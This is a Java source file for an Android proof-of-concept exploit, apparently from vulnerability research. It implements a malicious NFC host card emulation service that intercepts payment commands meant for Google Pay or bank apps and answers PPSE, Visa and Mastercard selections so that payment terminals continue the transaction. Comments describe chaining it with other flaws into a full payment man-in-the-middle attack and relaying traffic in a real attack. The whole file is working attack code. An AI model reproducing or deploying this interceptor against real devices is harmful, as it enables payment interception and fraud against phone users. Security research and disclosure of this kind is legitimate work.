package com.poc.nfchijack;

import android.content.Intent;
import android.nfc.cardemulation.HostApduService;
import android.os.Bundle;
import android.util.Log;

import java.util.Arrays;

/**
 * V-456 PoC: Malicious HCE service that intercepts NFC payment APDUs.
 *
 * When registered as preferred service (via setPreferredService in foreground),
 * this service receives ALL APDUs from the NFC reader instead of the legitimate
 * payment app (Google Pay, bank app, etc.).
 *
 * Requires only android.permission.NFC (normal, auto-granted) + foreground presence.
 *
 * Combined with V-452 (kill existing session) and V-451 (trigger new session),
 * this creates a full NFC payment MITM chain.
 */
public class HijackHceService extends HostApduService {
    private static final String TAG = "HijackHCE";

    // Standard APDU response: SW1=90, SW2=00 (success)
    private static final byte[] SW_OK = {(byte) 0x90, 0x00};
    // File not found
    private static final byte[] SW_NOT_FOUND = {0x6A, (byte) 0x82};
    // Generic error
    private static final byte[] SW_ERROR = {0x6F, 0x00};

    // PPSE (Proximity Payment System Environment) — standard NFC payment entry point
    private static final byte[] PPSE_AID = {
            0x32, 0x50, 0x41, 0x59, 0x2E, 0x53, 0x59, 0x53,
            0x2E, 0x44, 0x44, 0x46, 0x30, 0x31
    }; // "2PAY.SYS.DDF01"

    // Visa AID
    private static final byte[] VISA_AID = {
            (byte) 0xA0, 0x00, 0x00, 0x00, 0x03, 0x10, 0x10
    };

    // Mastercard AID
    private static final byte[] MASTERCARD_AID = {
            (byte) 0xA0, 0x00, 0x00, 0x00, 0x04, 0x10, 0x10
    };

    private int mApduCount = 0;
    private String mSelectedAid = "none";

    @Override
    public byte[] processCommandApdu(byte[] commandApdu, Bundle extras) {
        mApduCount++;

        String apduHex = bytesToHex(commandApdu);
        Log.w(TAG, "═══════════════════════════════════════════════");
        Log.w(TAG, "[V-456] INTERCEPTED APDU #" + mApduCount);
        Log.w(TAG, "  Raw: " + apduHex);
        Log.w(TAG, "  Length: " + commandApdu.length + " bytes");

        if (commandApdu.length < 4) {
            Log.w(TAG, "  → Malformed APDU (too short)");
            return SW_ERROR;
        }

        int cla = commandApdu[0] & 0xFF;
        int ins = commandApdu[1] & 0xFF;
        int p1 = commandApdu[2] & 0xFF;
        int p2 = commandApdu[3] & 0xFF;

        Log.w(TAG, "  CLA=" + String.format("%02X", cla) +
                " INS=" + String.format("%02X", ins) +
                " P1=" + String.format("%02X", p1) +
                " P2=" + String.format("%02X", p2));

        // SELECT command (INS=A4)
        if (ins == 0xA4 && p1 == 0x04) {
            return handleSelect(commandApdu);
        }

        // GET PROCESSING OPTIONS (INS=A8) — payment transaction initiation
        if (ins == 0xA8) {
            Log.w(TAG, "  ★ GET PROCESSING OPTIONS — transaction initiated!");
            Log.w(TAG, "  ★ Payment terminal is trying to read card data");
            // In a real attack, we could relay this to the legitimate payment app
            // For PoC, just log and return error to demonstrate interception
            return SW_NOT_FOUND;
        }

        // READ RECORD (INS=B2) — reading card data
        if (ins == 0xB2) {
            Log.w(TAG, "  ★ READ RECORD — terminal reading card records");
            return SW_NOT_FOUND;
        }

        // COMPUTE CRYPTOGRAPHIC CHECKSUM (INS=2A) — crypto operation
        if (ins == 0x2A) {
            Log.w(TAG, "  ★ CRYPTO OPERATION — terminal requesting cryptogram");
            return SW_NOT_FOUND;
        }

        Log.w(TAG, "  → Unknown command, returning error");
        return SW_ERROR;
    }

    private byte[] handleSelect(byte[] apdu) {
        if (apdu.length < 5) return SW_ERROR;

        int lc = apdu[4] & 0xFF;
        if (apdu.length < 5 + lc) return SW_ERROR;

        byte[] aid = Arrays.copyOfRange(apdu, 5, 5 + lc);
        String aidHex = bytesToHex(aid);

        Log.w(TAG, "  SELECT AID: " + aidHex);

        if (Arrays.equals(aid, PPSE_AID)) {
            mSelectedAid = "PPSE";
            Log.w(TAG, "  ★★★ PPSE SELECTED — Payment session starting! ★★★");
            Log.w(TAG, "  ★★★ This would normally go to Google Pay / bank app ★★★");
            // Return a minimal PPSE response indicating we "have" payment apps
            // In a real MITM, relay to the actual payment app
            return buildPpseResponse();
        }

        if (Arrays.equals(aid, VISA_AID)) {
            mSelectedAid = "VISA";
            Log.w(TAG, "  ★★★ VISA AID SELECTED — Visa transaction intercepted! ★★★");
            return SW_OK;
        }

        if (Arrays.equals(aid, MASTERCARD_AID)) {
            mSelectedAid = "MASTERCARD";
            Log.w(TAG, "  ★★★ MASTERCARD AID SELECTED — Mastercard transaction intercepted! ★★★");
            return SW_OK;
        }

        Log.w(TAG, "  → Unknown AID, returning not found");
        mSelectedAid = "unknown:" + aidHex;
        return SW_NOT_FOUND;
    }

    /**
     * Build a minimal PPSE response that tells the terminal we have payment AIDs.
     * This makes the terminal proceed with the transaction flow.
     */
    private byte[] buildPpseResponse() {
        // Minimal FCI template with Visa AID in the directory
        byte[] response = {
                0x6F, 0x23,                         // FCI Template
                (byte) 0x84, 0x0E,                  // DF Name
                0x32, 0x50, 0x41, 0x59, 0x2E, 0x53, 0x59, 0x53, // "2PAY.SYS"
                0x2E, 0x44, 0x44, 0x46, 0x30, 0x31, // ".DDF01"
                (byte) 0xA5, 0x11,                  // FCI Proprietary Template
                (byte) 0xBF, 0x0C, 0x0E,            // FCI Issuer Discretionary Data
                0x61, 0x0C,                          // Directory Entry
                0x4F, 0x07,                          // ADF Name (Visa AID)
                (byte) 0xA0, 0x00, 0x00, 0x00, 0x03, 0x10, 0x10,
                (byte) 0x87, 0x01, 0x01,            // Application Priority Indicator
                (byte) 0x90, 0x00                    // SW1 SW2 (Success)
        };
        return response;
    }

    @Override
    public void onDeactivated(int reason) {
        String reasonStr = reason == DEACTIVATION_LINK_LOSS ? "LINK_LOSS" : "DESELECTED";
        Log.w(TAG, "[V-456] HCE Deactivated: reason=" + reasonStr +
                " (intercepted " + mApduCount + " APDUs, last AID=" + mSelectedAid + ")");
        mApduCount = 0;
        mSelectedAid = "none";
    }

    private static String bytesToHex(byte[] bytes) {
        StringBuilder sb = new StringBuilder();
        for (byte b : bytes) {
            sb.append(String.format("%02X", b));
        }
        return sb.toString();
    }
}
